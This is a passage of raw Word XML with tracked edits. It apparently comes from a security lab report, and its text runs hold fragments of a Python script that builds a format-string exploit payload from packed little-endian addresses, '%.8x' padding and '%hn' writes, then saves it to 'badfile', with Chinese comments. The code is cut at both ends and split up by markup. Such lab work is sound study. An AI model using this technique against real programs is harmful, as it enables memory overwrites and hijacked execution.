                          <w:t>addr1 + 2</w:t>
                        </w:r>
                      </w:ins>
                      <w:del w:id="213" w:author="zhao ruizhi" w:date="2023-05-08T16:37:00Z">
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="0000FF"/>
                            <w:kern w:val="0"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:lang w:bidi="ar"/>
                          </w:rPr>
                          <w:delText>0x</w:delText>
                        </w:r>
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="098658"/>
                            <w:kern w:val="0"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:lang w:bidi="ar"/>
                          </w:rPr>
                          <w:delText>ffffd08e</w:delText>
                        </w:r>
                      </w:del>
                    </w:p>
                    <w:p w14:paraId="0578F1BF"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0</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]=(addr1).</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>to_bytes</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,byteorder=</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>'little'</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>)</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0BDEDF4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8</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).encode(</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0027F3FF" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
                      <w:pPr>
                        <w:widowControl/>
                        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                        <w:spacing w:line="190" w:lineRule="atLeast"/>
                        <w:jc w:val="left"/>
                        <w:rPr>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8</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]=(addr2).</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>to_bytes</w:t>
                      </w:r>
                      <w:proofErr w:type="spell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4</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>,byteorder=</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>'little'</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>)</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="17C82B45" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
                      <w:pPr>
                        <w:widowControl/>
                        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                        <w:spacing w:line="190" w:lineRule="atLeast"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:ins w:id="214" w:author="zhao ruizhi" w:date="2023-05-08T16:50:00Z"/>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="008000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="008000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t># 加上%x和%</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="008000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>hn</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                    </w:p>
                    <w:p w14:paraId="7530C14B" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRPr="00193C1A" w:rsidRDefault="00000000">
                      <w:pPr>
                        <w:widowControl/>
                        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                        <w:spacing w:line="190" w:lineRule="atLeast"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:rPrChange w:id="215" w:author="zhao ruizhi" w:date="2023-05-08T16:50:00Z">
                            <w:rPr>
                              <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                              <w:color w:val="000000"/>
                              <w:sz w:val="20"/>
                              <w:szCs w:val="20"/>
                            </w:rPr>
                          </w:rPrChange>
                        </w:rPr>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/>
                      <w:ins w:id="216" w:author="zhao ruizhi" w:date="2023-05-08T16:51:00Z">
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="000000"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                          </w:rPr>
                          <w:t>a</w:t>
                        </w:r>
                      </w:ins>
                      <w:ins w:id="217" w:author="zhao ruizhi" w:date="2023-05-08T16:50:00Z">
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="000000"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                          </w:rPr>
                          <w:t>ddr_little</w:t>
                        </w:r>
                        <w:proofErr w:type="spellEnd"/>
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="000000"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                          </w:rPr>
                          <w:t xml:space="preserve"> </w:t>
                        </w:r>
                      </w:ins>
                      <w:ins w:id="218" w:author="zhao ruizhi" w:date="2023-05-08T16:51:00Z">
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="000000"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                          </w:rPr>
                          <w:t xml:space="preserve">= </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cfd4</w:t>
                        </w:r>
                      </w:ins>
                      <w:ins w:id="219" w:author="zhao ruizhi" w:date="2023-05-08T16:53:00Z">
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="098658"/>
                            <w:kern w:val="0"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:lang w:bidi="ar"/>
                          </w:rPr>
                          <w:t xml:space="preserve"> </w:t>
                        </w:r>
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:kern w:val="0"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:lang w:bidi="ar"/>
                            <w:rPrChange w:id="220" w:author="zhao ruizhi" w:date="2023-05-08T16:53:00Z">
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="098658"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                            </w:rPrChange>
                          </w:rPr>
                          <w:t>+</w:t>
                        </w:r>
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="098658"/>
                            <w:kern w:val="0"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:lang w:bidi="ar"/>
                          </w:rPr>
                          <w:t xml:space="preserve"> 100</w:t>
                        </w:r>
                      </w:ins>
                    </w:p>
                    <w:p w14:paraId="6A74508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small =</w:t>
                      </w:r>
                      <w:ins w:id="221" w:author="zhao ruizhi" w:date="2023-05-08T16:51:00Z">
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="000000"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                          </w:rPr>
                          <w:t xml:space="preserve"> addr_little</w:t>
                        </w:r>
                      </w:ins>
                      <w:del w:id="222" w:author="zhao ruizhi" w:date="2023-05-08T16:51:00Z">
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="0000FF"/>
                            <w:kern w:val="0"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:lang w:bidi="ar"/>
                          </w:rPr>
                          <w:delText>0x</w:delText>
                        </w:r>
                      </w:del>
                      <w:del w:id="223" w:author="zhao ruizhi" w:date="2023-05-08T16:36:00Z">
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="098658"/>
                            <w:kern w:val="0"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:lang w:bidi="ar"/>
                          </w:rPr>
                          <w:delText>d134</w:delText>
                        </w:r>
                      </w:del>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15</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8</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0B429893"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large=</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="0000FF"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>0x</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="098658"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>ffff</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>-</w:t>
                      </w:r>
                      <w:ins w:id="224" w:author="zhao ruizhi" w:date="2023-05-08T16:51:00Z">
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="000000"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                          </w:rPr>
                          <w:t>addr_little</w:t>
                        </w:r>
                      </w:ins>
                      <w:del w:id="225" w:author="zhao ruizhi" w:date="2023-05-08T16:51:00Z">
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="0000FF"/>
                            <w:kern w:val="0"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:lang w:bidi="ar"/>
                          </w:rPr>
                          <w:delText>0x</w:delText>
                        </w:r>
                      </w:del>
                      <w:del w:id="226" w:author="zhao ruizhi" w:date="2023-05-08T16:35:00Z">
                        <w:r>
                          <w:rPr>
                            <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                            <w:color w:val="098658"/>
                            <w:kern w:val="0"/>
                            <w:sz w:val="20"/>
                            <w:szCs w:val="20"/>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:lang w:bidi="ar"/>
                          </w:rPr>
                          <w:delText>d134</w:delText>
                        </w:r>
                      </w:del>
                    </w:p>
                    <w:p w14:paraId="14E3FC19"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s=</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>"%.8x"</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15</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> + </w:t>
                      </w:r>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 xml:space="preserve"> + str(small) + </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x%hn</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094B0382"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 xml:space="preserve">    + str(large) + </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x%hn</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1DD23D17"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r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>fmt</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>=(s</w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>).encode</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>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'latin-1'</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>)</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="257E4AF0"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gramStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>content[</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>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098658"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>12</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>+len(</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>fmt</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>)]=</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>fmt</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                    </w:p>
                    <w:p w14:paraId="790D99C6" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:widowControl/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="19D130CD"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8000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t># 把构造好的字符串写入</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="008000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>badfile</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="008000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>文件</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0949E34C"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r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>file=open(</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badfile</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r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>wb</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>)</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="72A17E46"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proofErr w:type="gramStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>file.write</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>(content)</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="38762EF4" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
                      <w:pPr>
                        <w:widowControl/>
                        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                        <w:spacing w:line="190" w:lineRule="atLeast"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>file.close</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
